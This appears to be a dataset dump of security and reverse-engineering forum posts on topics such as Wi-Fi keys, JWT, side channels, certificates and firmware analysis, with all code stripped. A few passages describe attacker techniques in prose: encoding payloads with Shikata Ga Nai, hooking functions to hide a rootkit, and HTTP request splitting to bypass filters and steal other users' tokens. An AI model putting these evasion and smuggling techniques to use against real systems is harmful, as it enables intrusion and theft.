","The password is never sent. It is hashed, and that hash is used (indirectly) for encryption. The password can be passed through an algorithm called -HMAC-SHA1 with 256-bit output and a salt derived from the ESSID (network name) to generate the PSK, a raw 256-bit key. This PSK is used to authenticate a handshake, called the , between the client and the router where a random, per-session data encryption key is derived. The reason Windows does not store the raw PSK rather than the password is for better user experience. If someone doesn't know their password when adding a new device to the network, they can view it on Windows without needing to connect to the router's administrative panel. Storing passwords in an irreversible format is  where there exists a risk that a database of passwords will be stolen en masse. For a mere personal Wi-Fi password, this risk is far less pronounced. Please note that this only applies to WPA2-PSK. There are other Wi-Fi encryption standards, even under the WPA2 label, which do not use any kind of pre-shared password, such as WPA2-EAP, which can negotiate a key on the fly. To demonstrate that this is possible, this can be done on Linux with The line which was commented out containing the original passphrase has been removed. It's important to be aware that this PSK, if stolen, will give the attacker the same capabilities as if they stole the original password. They will be able to decrypt stored sessions and authenticate to your access point. However, they will not know the original password itself, which may be useful if it is used elsewhere (a bad idea).",96,391,1,True

","Don't roll your own crypto! This is the golden rule of cryptography. If you do, your application will crash and burn, and all the hackers will laugh at you. It has been done time and time again, with companies boasting about how their ""custom encryption algorithm"" is perfectly safe, because it's closed source and no hacker could ever figure out how it works. Turns out that it had huge glaring issues and exploiting it was trivial, every single time. Even expert cryptographers, who spent decades studying how to make good cryptographic algorithms, consider it extremely difficult to make an algorithm that is safe against all kinds of attacks. But what should we do now? That depends entirely on what your API actually does, and what you use these parameters for. What JSON Web Tokens do is ""representing claims securely between two parties"". If this is what your API needs, then you should absolutely go for JWT. Basically, once the user has authenticated themselves to your API, the API can then generate a JWT and send it to the user, which they can use to authorize themselves on every subsequent claim. But can't an attacker just copy my token and thus steal my authorization? Yes, if you used plaintext communication. But you should not be using plaintext communication, you should be using HTTPS to secure everything. So why would you actually use JWT then? Because it prevents the person you sent the token to from modifying the claim.

","To do this, you're gonna need to do some learning, I'm afraid. Googling ""how to do field encryption in a database?"" will probably get you started. In essence, you're gonna need to do the encryption (probably AES-GCM-256 encryption) in your application layer. Data comes in, application uses the AES key to encrypt it, and stick the encrypted blob in the database. When you retrieve a field from the database, the application uses the AES key to decrypt it and then use it. Once you have that infrastructure in place, using a different AES key based on the ID number of the record should be easy. The problem you're going to run into is how you securely store the AES keys. You can't put them in the database, because storing the decryption key next to the encrypted data is a big no-no. So do you just put the key in a flat file on disk of the application server? Do you use some obfuscation trick to obscure the key on disk? Do you buy a server with a good TPM on the motherboard, and write vendor-specific code to store your keys on the TPM? Do you buy a full HSM? These are tricky issues that don't have a good universal solution. If you're going to design and build such a system, you should become familiar with the tricky parts, and design a solution that fits what you have available.

","Side-Channel attacks are notoriously difficult to detect, because there are many side-channels that an attacker could look for. This includes, but is not limited to: Timing Attacks Cache Attacks Power-Monitoring Attacks Acoustic Cryptanalysis has an excellent list, from which this is just an excerpt. Since there are so many different side-channels, each one of them needs to be addressed independently. What about timing attacks? Your code is vulnerable to timing attacks, but you already knew that. The question is, how can you fix it? The solution would be to make a constant-time comparison. One example would be code like this: {code-blk} are the same length, e.g. because they are the output of a hash function. The code would accumulate the bit difference between each pair of elements, then returns a result based if the differences are zero.  Also beware that your friendly optimizing C compiler is at liberty to spot what this is doing and generate the assembly it would have generated for your original (broken) code.  You need to check the actual generate assembler (or use a library function designed for this). Of course, this would only protect against one kind of side-channel attack, and not others. What about the other side-channels? That depends entirely on the side-channel you are focusing on. Some, such as power consumption, require physical access (or other ways to measure consumption), so they may not be a problem if the attacker is far away. In general, in order to defend against side-channel attacks you need to: Be aware that the side-channel exists Check if this side-channel could be a potential problem in your threat model Check what information is leaked via this side channel Check how to prevent leaking this information",61,393,2,True

Shellcodes are normally written in hex and then when executed, they get decoded. They're not written like that for any of the reasons you mentioned though. Shellcode is often injected into the application during runtime, so it can't be written in some high level language bceause there's nothing to compile or interpret this code.

You also have packers and cryptors which help in hiding malicious code. As mentioned, Shikata Ga Nai is a commonly known encoder which can be used to encode your payload.

The document itself is not aware if it is served via HTTP or HTTPS, and if so, which certificate was used for that. Instead, these things are handled by the web server. A web server, such as nginx, can be given a certificate and the private key associated with the certificate. If configured to server HTTPS, then the web server will use said certificate in any incoming TLS connection. Regarding Multiple Certificates You seem to confuse ""web site"" for ""web server"", in regards to nginx. A web site is one document, where as a ""web server"" is one logical unit for nginx, with its own configuration and, more importantly, host name. As such, nginx can be configured as follows: {code-blk} If the web server was reached with the hostname server1.example.org, it would serve the certificate found in cert1.pem. Likewise, if it was reached as server2.example.org, it would server the certificate from cert2.pem. Regarding Web Applications Likewise, a ""web application"" is just a fancy name for a document with some server-side logic behind. But this also does not handle any certificates or TLS connections. In fact, it would make a web application a lot less portable if it did so, because any change in certificate would require changes to the codebase. This split was done intentionally, as it separates two different tasks. The task of the web server is to accept incoming connections, parse HTTP requests, handle TLS connections, etc.. Once all of this is done, the web server forwards the parsed requests to the web application, which then handles all the application logic.",100,427,3,True
10321,"pwnat, pronounced ""poe-nat"", is a tool that allows any
    number of clients behind NATs to communicate with a
    server behind a separate NAT with *no* port forwarding
    *no* DMZ setup, and *no* 3rd party involvement. The server
    does not need to know anything about the clients trying
    to connect.

    Simply put, this is a proxy server that works behind a NAT,
    even when the client is behind a different NAT, without any
    3rd party or network changes.

    There is no middle man, no proxy, no 3rd party,
    no UPnP/STUN/ICE required, no spoofing, and no DNS tricks.

    More importantly, the client can then connect to any
    host or port on any remote host or to a fixed host and
    port decided by the server.

So the only change in the original hard disk is a bit more wear and tear, which can be accessed through the SMART interface - but to check it reliably you need to have a SMART status save from immediately before the theft and another to compare taken immediately after recovery.

But if the counter went up, this only proves that the hard disk was powered on, not that it was read. The ""Read Data Counter"" is not available on all hard disks). Of course, power on time gives an idea of how much data could have been transferred (but, again unfortunately, this counter usually has a granularity of one hour. In one hour, much could have been copied).

One minor quibble is that it's not necessarily the DN that's being verified; nowadays the important information is usually carried in the SubjectAlternativeName field(s).

Also, to elaborate on your 2., the CSR format is specified in  and does indeed include a mandatory signature field. Any CA worth their salt should validate an incoming CSR by checking that the signature validates under the public key contained in the CSR and reject the CSR if it does not. {code-blk} field and have a syntactically-valid CSR, but anyone trying to process the CSR should reject it because it has a broken signature. Can I create a certificate for this CSR if I am the CA and I ignore to validate the private key ownership? If you're the CA you can do whatever you like. You don't even need a CSR; if you have access to the CA private key then you can create certificates containing data you want by producing the X.509 ToBeSigned (TBS) structure in a hex editor, signing it, and stuffing the TBS structure and signature bytes into the right place in an X.509 object. Can the above be trivially demonstrated using openssl commands which are available or does it need tweaks and custom tools? This I would need to go away and play with, which I don't have time for right now.

","Rooting is a term for gaining root privileges on a system. Detecting an attacker that has rooted your system is very difficult, since the root user can generally do anything it wants, including tampering with logs or modifying security software and configuration. Rooting is a very broad term and can encompass many things. An attacker who rooted a system may use hooking to hide his presence. Hooking is a specific technique that is often used in hacking (although also has a place in debugging). It usually entails replacing a target function with a ""dummy"" function that acts as a wrapper and contains code that evaluates or modifies arguments before passing them on to the ""original"" function, or even replaces the original function in its entirety. Below is example source code for a shared object that hooks a function from the fictional library {code-blk} This is not the only kind of function hooking. You can hook other APIs  as well.",165,223,1,True

","Compiler options can influence the security of the resulting program in several different ways. Generally speaking, optimization can hurt security. However, this is not a reason to always turn off optimizations! For example, if your encryption code is so slow that users disable the encryption feature and send data around in cleartext, that makes security worse. Undefined behavior Low-level languages such as C and C++ have a lot of areas with . ""Undefined behavior"" means that anything can happen, and compilers take advantage of this to optimize code. There a strong disconnect between the way typical developers see code and the way compilers see code. Often, what looks like an obvious optimization to a developer is hard for a compiler to detect, while compilers may perform optimizations that seem to the developer like it's exploiting a loophole. A classic example is that optimizing compilers will eliminate redundant checks. Sounds good, right? {code-blk} is a good compromise between performance and risk. Safety features Some safety features are partly under the control of the compiler. There, the obvious thing to look for is whether these safety features are enabled. These safety features generally don't help to defend against vulnerabilities, but they can make exploits harder. They often don't make exploits completely impossible, but they can make a difference between taking 5 minutes and 5 weeks to craft an exploit, and that can give the developer the time to develop and deploy a patch. For example, many compilers can generate . Stack canaries detect when a buffer overflow happens on the stack and halt the program. To exploit a stack buffer overflow, the attacker needs to limit the size of the overflow so that the canary isn't overwritten or arrange for the correct value to be written in the canary's place, neither of which are always possible or easy.",94,403,1,True

","Let's see what are the usages of Splitting attacks. But first thing to remember is that the final target is not the attacker, but HTTP agents between the attacker and the backend having the splitting issue. And one other detail, all this works using HTTP Pipelining (where you can send several requests without waiting for individual responses). One of the first usage is security filter bypass. You send 2 requests, but the splitting occurs on the first one and the backend respond with 3 responses. The second one is the new one, it's based on a query that the first did not saw (let's say the  ssl terminator or a reverse proxy cache, or any http load balancer). or this agent there were request 1 and request 2, and when receiving back 3 responses it will usually discard the 3rd response. Then content of response 2 comes from a hidden request (like a request which was hidden in the 1st request body, and only 'discovered' by the backend -- because there's an HTTP splitting issue exploited on this backend). The very fact that this request was hidden prevents the first agent from applying any security rule on this request (let's say this Load balancer should prevent access to {code-blk} content will be replaced by the script content instead of the home page in the Reverse Proxy Cache). Third classical usage is quite hard to implement, but it works with incomplete responses or incomplete queries. With responses or queries from other users completing the incomplete responses or requests. That's usually more a thing with request splitting than response splitting. But the main idea is to get a request or response with elements coming from other users (in the case of request you could get the cookie or bearer tokens of other users added to your headers, in case of response this is more about the page content). You can get more detail on this type of attacks on all HTTP smuggling papers. I can think of another bad usage, the complete mix-up of all requests and responses. On my first example I've been nice saying that the 3rd response was discarded. Some bad HTTP agents could also become completely crazy when the counter of requests and responses are bad. And they could start sending wrong responses to everyone.",104,489,2,True

The message itself is encrypted with a symmetric key, which I will call the ""Data Encryption Key"", or DEK for short. For each recipient, the DEK is then encrypted with the pubic key of the recipient. The public key, used to encrypt the DEK, is sometimes called the ""Key Encryption Key"", or KEK for short. So, for a message sent to two recipients will look like this: {code-blk} The recipient will then see this message, and attempt to decrypt the first key container with every private key they have available. If decryption fails for all of them, they move on to the second container, then the third, and so on, until one of two things happens: Every key container has been attempted and none could be decrypted.

When signing a certificate, the CA asserts indeed that the private key belongs to a particular entity and what that private key is allowed to do. Being allowed to sign certificates is one of the possible ""authorizations"". In practice, the owner of the private key can sign whatever he wants with it. However, compliant web browsers would reject signatures that are cryptographically valid but do not match the purposes of the certificate. Root and intermediate CAs therefore have fields that indicate they are allowed to sign SSL certificates. The fields . For example, these extensions would ensure the certificate can sign other certs: {code-blk}. Therefore, it is possible for example that, the day you create the root certificate, you impose that no intermediate CA can be derived from the root by setting the pathlen to zero. In that case, even if the root mistakingly signs a certificate with CA extensions, certificates signed by the intermediate cert should be rejected by well behaved browsers.",42,252,1,True

","Background Lets start from the top here. Your server receives a request: Hi server, Can you do X for me? - Jane Access Control is when the server checks to see that Jane is actually allowed to do X before processing the request. Generally speaking, all apps will have some endpoints that need an access control check -- maybe Jane is not allowed to delete records from the DB, or maybe Jane is not allowed to change settings of Bob's account, etc. OWASP's point is that in an old-school app, when the user logs in, you might build a session info object telling you who the user is and what permissions they have, and keep that in server memory until the user logs out. Obviously that does not scale with modern cloud architectures. JWT To The Rescue! The key part of that OWASP quote is (emphasis mine) user authentication should be centralised in a Identity Provider (IdP), which issues access tokens Take anything that your microservices need to know about the user (ie anything that you would traditionally have put in the sessionInfo object) and stuff it in a JWT, hand it to the user, and have them hand it back with each REST call. Omitting the crypto parts of a JWT, the claims you care about might be: {code-blk} every 15 mins / 1 hr / 24 hrs is usually a reasonable security-performance tradeoff. In some simple cases you may not have any meta-data and you just want to check that a request is coming from another authorized component; basically a ""Are you me?"" check. In these cases I've seen each component get a copy of the same symmetric JWT and just create themself a token before each request.",37,403,2,True

","tl;dr–  As quick-thoughts, you might generate a portfolio of hashes (instead of a single hash) for each fingerprint, such that you can check the contents of two different portfolios for overlap.  Alternatively, homomorphic encryption. I guess you could go in two directions: Use a portfolio of hashes.Generate a set of approximately-equal fingerprints, then hash each of them separately.  Store all of the hashes in a portfolio; compare hashes in two portfolios to assess potential similarities. Use homomorphic encryption.Do normal fingerprint-comparison stuff, but using homomorphic encryption. Option 1: Portfolio of hashes. The basic idea is to: Round your fingerprints to a local approximation. Generate a portfolio that includes the local-approximation plus all close-enough-to-be-matching points. Hash each item in the portfolio separately. For example, say you want to store a date (like someone's birth-date) and you want to hash it, but you want to be able to assess if another date is close after hashing.  Then: Round the date its nearest coarse-grain approximation. For example, if you approximate dates within 3 months and someone was born 2021-08-07, then round that to 2021-09-01. Generate a set of points about that rounded-value in each direction. For example, if someone was rounded to 2021-09-01, then generate points for { {code-blk} Conceptually, the fundamental problem is that cryptographic-hashes intentionally remove the ability to compare if two values are close, but we can still calculate the set of nearby points before hashing. Then each fingerprint-hash encodes one local approximation that'd be considered a match.",87,424,1,True

","Now I'm generating fake certificate for some domain that owns someone else and sign it with my private key from that pair. The detail you're missing is that certificates contain fields that restrict the types of operations that a certificate can be used for. The CA will not provide you with a certificate that can be used to sign other certificates. As an example, here's what the server certificate for this website shows: {code-blk} This again is a CA certificate, but without the path length constraint, meaning that it can be used to sign intermediate CA certificates as well as End Entity certificates. Unlike the intermediary CA key, the root CA key is disallowed from directly creating digital signatures - it can only be used for certificate and CRL signing. This is to prevent abuse of the CA cert if it is compromised. Finally, you can see that the enhanced key usage allows the CA certificate to be used to sign certificates for a variety of purposes other than just client and server authentication. This allows the root CA to generate intermediate CA certificates for things like authenticode and email signing, separate to certificates intended for HTTPS. The client can look at the chain and validate these usage constraints. If you got an End Entity certificate issued by a trusted CA, then manually took the key and used it to sign another End Entity certificate for a different website, the client would see that the chain includes an End Entity certificate, without Certificate Signing usage, somehow signing another End Entity certificate. It would reject that chain.",222,327,1,True

Hash the result from the Analyzer (slow hashes improve security). a. Use random salts associated with the records - encrypt salts. Store the hash as Hex as String in the index (hashes are one-way).

","Foreword It should be noted that this process is what I'd consider overkill for the average person hoping to protect perhaps some private files that wouldn't have life-long effects on their livelihood. The below explanation is more so to elaborate on the answer to the question of what's possible and makes no means to make any claims as to what's realistic. Yes, it's possible. In fact, it would be the next level of security and steps you would take to secure a system containing highly sensitive or classified information. That is, if you really wanted to go the extra mile and hide it, you can. However, as others have mentioned, it's definitely overkill if it's just some private photos you are worried about, but if you had something more valuable to protect then it is possible to ""hide"" this by essentially putting it elsewhere. Physically hiding by keeping it separate Also known as using a Detached Header for your LUKS device, you can remove the header and keep it separate from the system so that without it, there wouldn't seem to be a system to even boot because the separated header can act like a key whereas you would need the header file to supply the information needed by the system to identify the drive as an encrypted drive and provide the means to unlock the partition. Without it, a bad actor would only be able to destroy the data but not access it. Since we're being cautious, you can take it a step further and also keep the boot partition on the same USB drive so that it also holds the kernel image and initramfs images files with the root partition's LUKS header file (keeping the boot partition and header fil in separate partition. That should address your concern as all that's left is encrypted data.

","On a clean Windows XP SP2 installation running inside a VirtualBox VM, when doing a snapshot with vboxmangage debugvm --dumpguestcore and analyzing it in Volatility, I always find 9 VADs with PAGE_EXECUTE_READWRITE permissions in winlogon.exe process. I have already asked this question here, but for winlogon and csrss process: I was able to find out that RWX VADs in csrss.exe processes are heaps. Unforunately I can't confirm this for the VADs in winlogon.exe. But I've read an article ""Integrity verification of user space code"" in the Digital Investigations journal, where there is some information about these RWX VADs. The article can be found here: In this article Andrew White and his colleagues make the following statement: Aside from the default executable sections, Windows XP also exhibits some default behaviour in two system pro- cesses that create unverifiable allocations. The first process is winlogon.exe, in which 9 executable and writable allocations are created that appear to onlycontain data. Each of these allocations are 4 pages long, and are sparsely populated. The locations of these allocations can be found in an array within the .data section of winlogon.exe, typically starting at winlogon.exe + 0x72b0c. Unforunately I can't confirm this. Which I assume is due to me using Windows XP SP2 while they use XP SP3. Which probably results in a change of this address. The code they've written for their approach is open source (it is based on volatility plugins), you can find it here:  The function they've written to extract the array in the data section is: {code-blk} Do you have an idea how they found this address?

Which makes sense with this function because the first time in the loop the key is added to 0, which means it is simply the key. But then this guy used some type of weird CFB type xor encryption where it uses the previous xor'ed byte with the key next.

A similar question on StackOverflow received a lukewarm response. This question is focused just on inserting a detour rather than ""modification"" in general and I think the audience here will be more receptive.

I've tried using ollyDbg and : the former simply does nothing, while the latter complains with an ""Error starting process (invalid pe?)!"" message. I think this might have to do with the fact that said executable is digitally signed. I did some quick research and  came up, where I learned that digital signatures in windows executables are referenced in the file's PE header, which I think might be what x64dbg was complaining about. The executable I'm talking about is the Mumble windows client version 1.2.10. It is the only executable signed with two different digital signatures, which further reinforces my hypothesis. Sadly, even after stripping the digital signatures using the delcert.exe linked in the SO question above, the problem remains which brings me to a dead end. Is it possible digital signatures are messing these debuggers up? Is it possible that the signature stripping tool doesn't produce a valid pe file for the debuggers I tried? What else could I be doing wrong? As a footnote: I know mumble is free software and I could just compile my own version, but this is Reverse Engineering, right? Update: Following Jason comment, I'm posting the ollydbg log, which doesn't really say anything, unfortunately: {code-blk}",80,327,1,True

","I would like to reverse-engineer the software that came with my Chinese-made laser engraver. Unfortunately the hardware does not play at all with other software out there... The original software is horribly buggy, is loaded with malware (specifically the Strictor Trojan), and the vendor is refusing to give support for the program. I would like to get the original code of this program so that I may remove the Trojan, debug the software, and just make the damn thing work. I paid over $400 for the thing and frankly I am quite pissed off at the fact that the software is complete SHIT. (pretty sure it hasn't been updated since win2k...) It acts as if it were written by some highschool kid as a senior project or something... severely limited and severely bugged. So looking at the error files this program keeps pumping out, i WAS 100% sure that the main program was made in .net (not sure if VB, VC, VC++, etc). it's stating errors with ""windows.form.button..."", ontop of that, they required .net framework to be installed in order to use it. Which made me think possibly VB? However after trying VBDecompilerLite, it stated that the program was compiled using an unknown compiler... so i'm at a loss here. I have tried to extract the code from the exe using DeDe, ResourceHacker, Universal Extractor, 7Zip extraction, etc - all of which produce a 0b file ""[0~]"" which is unreadable, or an error saying could not extract files. If anyone has a clue of what I could try next, please let me know. I cannot upload the file for people to test because - as I stated above - it contains malware.

","I have recently been sifting my way through a whole load of assembly to try to identify how a program is decrypting some data. Thus far I have identified how the IV is extracted, that the IV is 16 bytes long and that the decryption method uses Cipher Block Chaining. Consequently I believe that the encryption method being used is AES-128-CBC. The next step has been to try to identify the key being used to decrypt with, the issue is that the assembly for the individual block cipher encryption is about 2.5MB in size. However, what I have observed is that it is all of a very similar form, for example, a snippet: {code-blk}). My current hunch is that this may be an AES-128 implementation with unrolled rounds. Does this look AES-128 to you and do you agree the encryption been deliberately obfuscated to hide the key? If so then how has it been obfuscated and would it be possible to find the key?

Here is more detailed information. (extracted from radare) {code-blk} This file I have been able to virtualize with qemu-arm. In the BFLT files there is a section containing all the string and using IDA Pro with the bfltldr plugin to relocate the strings. For debugging I have used the architecture arm litte endian generic Analyzing the application with IDA Pro, I was able to observe that it expects from the outside some commands with a format and some parameters. The parameters I have but the arguments do not as it is complicated to debug without having any kind of information about the name of each function.

","My goal is far from nefarious. After several polite attempts to try and get Lenovo to implement a proper keyboard backlight control, I've had no response. They do have a Windows Store app which adds that control, however, it's not tied to keyboard or mouse input (idle user time). I can implement that, with AutoHotKey, if I manage to call their methods. Screenshots for reference: Using JetBrains I can see a quite readable code, written in .NET (I assume), my main interest is in Keyboard_Core.dll. There I can see the methods for getting and setting the keyboard backlight, but I don't understand how they work. {code-blk} are new objects until the end of the function. I don't know how to call a random address (function) with some prepared parameters (stack) - should I stick to AHK (then it would be a different question), try Python (another layer), PowerShell (never used it) or create a small C program? Either way, it looks that I have to set 4 bytes somewhere in memory. Perhaps I'm chasing the wrong end and these functions just set a temporary/proxy object that is later handled by a monitor thread.

","I'm new to using x32/64dbg and I have an EXE with PDB symbols and want to disassemble and debug an unmanaged function call. It's from an x86 .NET 2.0 DLL where the unmanaged code sits compiled inside the EXE. I have looked up the internal call that I want to debug in the symbols, and set up breakpoints on the entry and exit of the function. The function takes a set of 3 32-bit floats in the .NET DLL method call as inputs through an internal call that runs some calculations and then outputs a set of 4 32-bit floats back to .NET. The function basically does a few sin/cos/atan2 calls on the parameters, along with some other math that I want to review for accuracy. Is there a way to read the parameter values as floats? I couldn't seem to find this in the docs anywhere. Basically I just need to get the values of the inputs and outputs to the function. In the lack of finding a method I tried to whip up a quick app to input 4 bytes as hex and output the sign/exponent/significand based on some docs here () but my results aren't matching up with the app's input, I'm sure I'm not doing something right.

","Essentially, I'm looking for a tool that could reconstruct pseudocode with conditional operators, loops, break/continue, etc. from assembly language code for an arbitrary CPU, given only a limited understanding of the assembly constructs related to control flow, and taking anything that it doesn't understand as opaque blobs. Alternatively, it wouldn't need to understand any assembly if it could take pseudocode ""if (condition) goto label"" and ""goto label"" as basic block boundaries. For example, {code-blk} are ""too large"". Also, the variables A to F don't have to follow any addressing mode conventions, they can be arbitrary strings, reproduced literally in the output. The tool doesn't need to know anything but how the labels look like, and the style of the comparison operators and the branches (one comparison instruction produces condition codes consumed by various branch instructions, vs. various comparison instructions produce a true/false value in a register, consumed by ""branch if true"" and ""branch if false"" instructions, etc). Things become somewhat nontrivial when these structures are nested, labels are reused, break/continue were used in the source code, incidental non-structured control transfers may occur, and so on. Switch/case statements are separate story. To recognize them adequately, a deeper understanding of the underlying ISA is needed.

","So I recently read [1] which evaluates several disassemblers. The truth/test binaries are generated by the SPEC CPU 2006 Benchmark suite. The authors provide detailed build instructions for the ELF set inside a VirtualBox. However, reconstructing the Windows binaries seems impossible for me, as the authors didn't provide the SPEC configuration files for building those binaries. So building the binaries with Visual Studio 2015, which actually match with the provided mapping files [2] didn't work (bruteforcing/guessing the compilation settings). For example, most of the samples ""SPEC/vs15-32/C++"" and ""SPEC/vs15-32/C"" have the following prologue of the .text base (see appendix for properties description): {code-blk} [1] An In-Depth Analysis of Disassembly on Full-Scale x86/x64 Binaries by Dennis Andriesse: Zeus is a family of credential-stealing trojans which originally appeared in 2007. The first two variants of Zeus are based on centralized command servers. These command servers are now routinely tracked and blocked by the security community. In an apparent effort to withstand these routine countermeasures, the second version of Zeus was forked into a peer-to-peer variant in September 2011. Compared to earlier versions of Zeus, this peer-to-peer variant is fundamentally more difficult to disable. Through a detailed analysis of this new Zeus variant, we demonstrate the high resilience of state of the art peer-to-peer botnets in general, and of peer-to-peer Zeus in particular.",426,378,1,True

","I am trying to disassemble the firmware for the Cisco Sx300 switch as found here: While some documentation for other iterations of Wind River's firmware exist, I have not encountered a working set of tools for this particular firmware. Binwalk gives some results: {code-blk} However, extraction with the -e flag doesn't provide meaningful results. Several files are extracted, but others end up as corrupt archives, or file that are are too small to be actual files. I am not certain that the LZMA compressed data isn't false positive. Disassembly with IDA fails, as I do not know the loader address. This Cisco help resource suggests that there is some form of compression going on: This help support post confirms that the Firmware is ARM based, but I am not certain as to the exact make of the chip. I am aware that previous iterations of the VxWork's Firmware had the loader address in the header. Analysis of the header did not find a useable address at the suggested location (0x14) I attempted to match up the strings in the firmware to string tables and was not able to find any string tables, despite a thorough search. This supports my notion that it is compressed, or otherwise packed. Lastly, I searched through the binary for probable addresses in order to deduce the loader address. I was not able to find any commonly referenced addresses or ranges. This was especially hard, as none of the binary was able to be correctly analyzed by IDA. Am I missing something easy and fundamental here? Is there a special technique for VxWorks firmware?",388,362,1,True

","As asking a friend and no amount of Googling yielded an answer, I figured I'd make an account and give this place a go. I'm working on reverse engineering the server for a relatively old game with no network packets from when it was alive. The game only made partial use of SSL (don't know what for specifically), and nothing I send it seems to trigger any response. The game sends a packet via a TCP PSH after the connection is established, and Apache replies with a 400 Bad Request. If Apache doesn't send any error, the game will wait indefinitely for a response. Due to lack of environment variables in the data and a defining request (HTTP GET, SSL handshake, etc.) from the game, it's unclear as to what it's expecting. CGI scrips, digest authentication, nor anything I can think of matches the contents. Here's the packet dump.

I searched through IDA and went to the start function which should point where the main user code is, so here are my problems: The start function's analysis has failed and I have failed to find where the code redirects to the CreateProcess function which I used in the code, this is how it looks: When I look up ""calc.exe"", I find it in a different section, where I'm not used to see it (as compared to the Practical Malware Analysis book examples). This is how it looks: I have IDA pro 6.8 installed. This is how the original code looks, the main function only contains a call to the Create() function: {code-blk} EDIT: I added to linked PDB file that was in the Release folder and IDA works great and it immediately detects the main function!

In theory, based on the memory contents of X8, this instruction should have loaded 0xff into w8 through the assembly instruction ldrb w8, [x8] Problem Faced: Upon evaluation of the instruction the actual memory contents in w8 was 0xfe and NOT 0xff. This is really an unexpected behaviour as my ARM knowledge tells me that the correct value for that evaluation should be 0xff and not 0xfe. Things I have tried  but failed to explain this behaviour Creating mini Xcode iOS app and trying to replicate the same instruction set and memory state Setting watchpoints to observe if any part of the program is editing the memory in-between Looking for memory protections such as mprotect if they have modified that memory region I would be highly appreciative of anyone who can point me in any right direction or ways so that I can better understand this mysterious behaviour. If it was my misunderstanding in ARM instruction, please do tell me too. Thank you so much everyone.",79,441,1,True

","I am trying to port Enrique Nissim's script from his presentation ""Reverse Engineering and Bug Hunting on KMDF Drivers"" to IDA 7.4. His original script can be found at: My somewhat updated version can be found at: While I have eliminated most of the errors, I noticed that on all of the drivers I tried it on some of the constants fail to be added to the IDA database. Errors like these propagate upon running the script: {code-blk} The big question for me is why is this type import failing? Is it because the types already exist, or is there some subtle syntax error here? Is the flag parameter here mandatory? The error and documentation make is very difficult to tell exactly what's going on here. The reason why I care is I believe that the failing imports are contributing to the driver failing to find IoControlls, driver major functions, and other important structures for reverse engineering KMDF drivers. Here are my main theories for why this is happening: Somehow the behavior of import_type doesn't exactly work closely enough to the original Til2Idb method that was in the original script. The types are somehow are already in the database in some conflicting way due to flirt signatures or something. I tried looking for them manually, but I don't see them being added on any of the drivers I have tried with the script. This is IDA telling me that the constants cant be added because they don't exist in the database and the script is functioning more or less as intended. If this is cases I wish the IDA docs would give me some indication of this behavior. I hope this makes the question clear guys. I hope you can help! Update: As an added wrinkle, when I manually import the header file this is parsing IDA doesn't generate any errors.",332,402,1,True

","Data Interleaving is a term I made up to reflect an idea I've been contemplating lately; interleaving the bits of a set of variables into a single binary blob. Any number and types of variables could be interleaved together. Access to variables in the interleaved blob can even be on-demand, with a controller class encoding or decoding variables on the fly. What in the World? Data Interleaving is the process of translating any number of variables to a single binary blob by interleaving the bits of the variables. This obfuscates the variables in memory or external storage. The entire blob need not be decoded to access member variables, though it can be for improved performance. Why? This will help complicate reverse engineering of code. It will particularly deter identifying data types and variables. Plaintext is also well obfuscated with this interleave. Interleave Map The variables to be encoded could be defined by an array of byte sizes of those variables and, optionally, pointers to a location in memory to retrieve or store their reconstituted form. In the case of on-demand access to an interleaved blob, individual variables can be decoded and re-encoded on the fly, so buffers for reconstituted storage are optional (though they may be temporarily reconstituted by the controller class as members are modified). The members of the bitwise interleave can be referenced in the source code via their indices. For instance, index 0 may be MY_VARIABLE_INSTANCE. By passing the variable index to an interleave blob controller class, it knows the size and, optionally, a pointer for constituted storage. Member data types can be anything. They need not be similar. When one variable ends, it is simply ended. See a few paragraphs below for what happens when a single variable is longer than the others. {code-blk}",332,459,1,True

","Kernel perspective: I will try to answer from the kernel perspective, covering various OS's. is the old way of accessing memory regions. All major operating systems including OSX, Linux, (from version 0.1) and Windows (from NT) are now using  which is a better way (IMHO) of accessing memory. Intel, has always introduced backward compatibility in its processors (except IA-64, and we saw how it failed...) So, in its initial state (after reset) the processor starts in a mode called , in this mode, segmentation is enabled by default to support legacy software. During the boot process of the operating system, the processor is changed into , and then in enabled paging. Before paging, the segment registers were used like this In real mode each logical address points directly into physical memory location, every logical address consists of two 16 bit parts: The segment part of the logical address contains the base address of a segment with a granularity of 16 bytes, i.e. a segments may start at physical address 0, 16, 32, ..., 220-16. The offset part of the logical address contains an offset inside the segment, i.e. the physical address can be calculated as {code-blk} register to access the TLS (thread local storage) and in Linux it's for accessing cpu specific memory. User perspective: From the user perspective, in recent operating system that uses paging, the memory works in so called ""flat mode"". Every process access its own memory (4GB) in linear fashion, so basically the segment registers are not needed. They are still registers, so they can of course be used for various other assembly operations.",52,382,2,True

","This is a hex dump of your sample file: {code-blk} As you can see, the file clearly has a pattern where 4 bytes seem to repeat: - Byte one goes up and down, and might have to do with the sound level - Byte two alternates between DA and 5A - note DA is just a 5A with the highest bit set - Byte three seems to be slowly ascending, maybe a time indicator - Byte four is A0 and might be the high order byte of the time. However, without any information about the sound level that has been recorded, or some expected values from the raw bytes, every guess is quite hard to verify.

","It's certainly not a well known format. A quick glance at the file with a hex viewer shows that it mainly consists of records that all have similar, but not identical, size and layout; the very end of the file seems to be something different. The first 2 Bytes - 047E - seem to be the number of records (1150). Each of the records seems to start with 7 strings that, in most cases, denote a country, adjective for the country, capital, and team name - i'd guess the save file is from a soccer game or similar. For example, one of the record starts at {code-blk} for 67 teams. You could now proceed to compare this to what happens when you load the save file into the game; is there anything that's special for exactly 16, or 67, of these 1150 teams? You could also look for the teams that have these values, and check what's special for these exact teams. Investing a lot of time into this will possibly allow you to identify most bytes without actually decompiling the application. However, i'd expect you can identify only a few of the values this way, and you will need to do what Jason suggested if you really want to understand everything. On the other hand, if the team/capital/country names are the only thing you're interested in, my program will already output them for you.",325,316,1,True

